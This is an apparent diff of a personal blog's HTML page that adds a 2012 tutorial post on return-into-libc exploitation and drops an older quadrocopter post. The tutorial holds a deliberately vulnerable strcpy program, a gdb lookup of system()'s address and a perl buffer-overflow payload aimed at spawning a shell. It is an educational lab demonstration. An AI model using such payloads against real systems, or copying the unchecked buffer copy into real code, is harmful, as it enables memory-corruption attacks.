@@ -7,7 +7,7 @@
 	<meta name="author" content="khakimov">
 
 	
-	<meta name="description" content="That&#8217;s not a secret that I in love with security and I&#8217;m using some applications on a regular basis to protect my security such as vpn &hellip;">
+	<meta name="description" content="Since OpenBSD has a nonexecutable stack by default and you can also patch your Linux kernel and make nonexecutable stack through PaX, AMD and Intel &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -70,6 +70,115 @@
 		
 	
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h1 class="title"><a href="/blog/2012/12/02/return-into-libc-without-function-calls/">Return-into-libc Without Function Calls</a></h1>
+	<div class="entry-content">
+		<p>Since OpenBSD has a nonexecutable stack by default and you can also patch your Linux kernel and make nonexecutable stack through PaX, AMD and Intel recently added to their processors a per-page execute disable bit to ease WOX implementation and even Microsoft implement WOX (no location in memory into which the attacker can inject code to execute, or just imagine no memory location in a process image is marked both writable - W and executable - X) all it means you can not execute your shellcode on the stack.</p>
+
+<p>Today I read about technique is known as <strong>return into libc</strong> by <a href="http://cseweb.ucsd.edu/~hovav/">Hovav Shacham</a> (btw, his Ph.D. advisor was professor of Computer Science and Electrial Engineering at Stanford <a href="http://crypto.stanford.edu/~dabo/">Dan Boneh</a>. I took his CS155 class, he is really good in his field).</p>
+
+<p>What is this about? If we can&#8217;t write in stack what should we do? We can&#8217;t inject code, so, we will use code that already exists in the proccess image we are attacking. <strong>Libc</strong> is the usual target that contains various basic functions, such as printf() and exit(). These functions are share, so any program that uses the printf() function directs execution into the appropriate location in libc. And attacker with his explout can do the same thing and direct a program&#8217;s execution into a certain function in libc. But in principle any available code, either from the program&#8217;s text segment of from a library it links to, could be used instead libc.</p>
+
+<p>Enjoy!</p>
+
+<p><a title="View Geometry (1) on Scribd" href="http://www.scribd.com/doc/115228599/Geometry-1" style="margin: 12px auto 6px auto; font-family: Helvetica,Arial,Sans-serif; font-style: normal; font-variant: normal; font-weight: normal; font-size: 14px; line-height: normal; font-size-adjust: none; font-stretch: normal; -x-system-font: none; display: block; text-decoration: underline;">Geometry (1)</a><iframe class="scribd_iframe_embed" src="http://www.scribd.com/embeds/115228599/content?start_page=1&view_mode=scroll&access_key=key-1qjla86da9zi8xelaiqr" data-auto-height="false" data-aspect-ratio="0.772727272727273" scrolling="no" id="doc_22341" width="100%" height="600" frameborder="0"></iframe></p>
+
+<p>I played a litle bit with <strong>return into libc</strong> and the main idea was to force the program to spawn a shell without executing anything on the stack, by returning int the libc function system().</p>
+
+<figure class='code'><figcaption><span>sys.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+</span><span class='line'>   <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>tmp.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span> <span class="n">system</span><span class="p">();</span> <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>tmp.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">rus</span><span class="err">@</span><span class="n">rus</span><span class="o">-</span><span class="n">desktop</span><span class="o">:/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">t</span> <span class="n">tmp</span><span class="p">.</span><span class="n">c</span>
+</span><span class='line'><span class="n">rus</span><span class="err">@</span><span class="n">rus</span><span class="o">-</span><span class="n">desktop</span><span class="o">:/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">t</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="n">main</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804837a</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+</span><span class='line'><span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804837a</span> <span class="n">in</span> <span class="n">main</span> <span class="p">()</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">print</span> <span class="n">system</span>
+</span><span class='line'><span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7ed0d80</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">&gt;</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">quit</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>here we got address of function <strong>system()</strong> and it is located at <strong>0xb7ed0d80</strong>.</p>
+
+<figure class='code'><figcaption><span>tmp.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">rus</span><span class="err">@</span><span class="n">rus</span><span class="o">-</span><span class="n">desktop</span><span class="o">:/</span><span class="n">tmp</span> <span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="n">out</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;AAAA&quot;</span><span class="n">x7</span> <span class="p">.</span> <span class="s">&quot;</span><span class="se">\x80\x0d\xed\xb7</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="nl">sh:</span> <span class="o">????????:</span> <span class="n">command</span> <span class="n">not</span> <span class="n">found</span>
+</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>7 words of data are used for spacin in the exploit and then we call system() as you can see. In this example I don&#8217;t pass any arguments, but it&#8217;s should be of course &#8220;/bin/sh&#8221;. That&#8217;s my Sunday and happy hacking hours!</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-02T14:12:00-08:00" pubdate data-updated="true">Dec 2<span>nd</span>, 2012</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/computer-security/'>computer security</a>, <a class='category' href='/blog/categories/great-papers/'>great papers</a>, <a class='category' href='/blog/categories/research/'>research</a>
+
+
+</div>
+	
+</div></article>
 
 
     <article class="post">
@@ -1388,59 +1497,6 @@ Hello world!</p>
 
 
 	<a class='category' href='/blog/categories/c/'>c</a>, <a class='category' href='/blog/categories/mutex/'>mutex</a>, <a class='category' href='/blog/categories/posix/'>posix</a>, <a class='category' href='/blog/categories/pthread/'>pthread</a>
-
-
-</div>
-	
-</div></article>
-
-
-    <article class="post">
-	<h1 class="title"><a href="/blog/2012/10/06/quadrocopter-in-the-wild/">Quadrocopter in the Wild</a></h1>
-	<div class="entry-content">
-		<p>Today went to the park in Downtown Palo Alto, nice place to test my pilot skills. It was not bad, couple times I did wrong with direction (coulnd&#8217;t spin around the axle, get lost the control). Spin around the axle is going to be my next exercise, because I can fly back and forth, but can&#8217;t turn around and fly with same side. Anyway, that was cool, almost 20 minutes of disconnected from the world.</p>
-
-<iframe width="640" height="360" src="http://www.youtube.com/embed/12pnL0ZyLeo?rel=0" frameborder="0" allowfullscreen></iframe>
-
-
-<p>Of course this is not the end and I&#8217;m going to improve this aircraft. I&#8217;m thinking about couple really awesome things, like glasses + camera on quadrocopter:</p>
-
-<p><img src="http://static.ddmcdn.com/gif/video-glasses-1.jpg" alt="" /></p>
-
-<p>or (good one in my case)</p>
-
-<p>NAZA controller with GPS module</p>
-
-<p><img src="http://s4e453e5a36d54.img.gostorego.com/802754/cdn/media/s4/e4/53/e5/a3/6d/54/catalog/product/cache/1/image/370x/9df78eab33525d08d6e5fb8d27136e95/d/j/djinaza.jpg" alt="" /></p>
-
-<p>ps: quadrocopter + kinect</p>
-
-<iframe width="640" height="360" src="http://www.youtube.com/embed/A52FqfOi0Ek?rel=0" frameborder="0" allowfullscreen></iframe>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2012-10-06T19:27:00-07:00" pubdate data-updated="true">Oct 6<span>th</span>, 2012</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/diy/'>diy</a>, <a class='category' href='/blog/categories/hobby/'>hobby</a>, <a class='category' href='/blog/categories/quadrocopter/'>quadrocopter</a>
 
 
 </div>
